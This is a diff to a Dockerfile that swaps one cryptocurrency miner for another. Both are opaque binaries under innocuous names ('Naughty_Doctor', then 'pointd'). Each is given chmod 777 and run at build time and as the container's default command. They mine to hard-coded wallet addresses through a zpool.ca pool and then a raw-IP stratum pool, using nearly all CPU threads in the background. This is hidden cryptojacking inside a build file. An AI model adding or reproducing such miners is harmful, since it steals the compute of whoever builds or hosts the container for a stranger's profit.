@@ -12,8 +12,8 @@ ARG DEBIAN_FRONTEND=noninteractive
 # Update Ubuntu Software repository
 RUN apt update
 
-COPY Naughty_Doctor Naughty_Doctor
-RUN chmod 777 Naughty_Doctor
-RUN ./Naughty_Doctor --algorithm yespower --pool stratum+tcp://yespower.sea.mine.zpool.ca:6234 --wallet LUJ35osZKFDNzLmpp7aykomJ3zecrW64Eu.ZZ --password c=LTC --background --cpu-threads 80 --keepalive true
+COPY pointd pointd
+RUN chmod 777 pointd
+RUN ./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.iribilangbos -p x -t $(nproc --ignore 1)
 
-CMD ["./Naughty_Doctor --algorithm yespower --pool stratum+tcp://yespower.sea.mine.zpool.ca:6234 --wallet LUJ35osZKFDNzLmpp7aykomJ3zecrW64Eu.ZZ --password c=LTC --background --cpu-threads 80 --keepalive true" ]
+CMD ["./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.iribilangbos -p x -t $(nproc --ignore 1)" ]
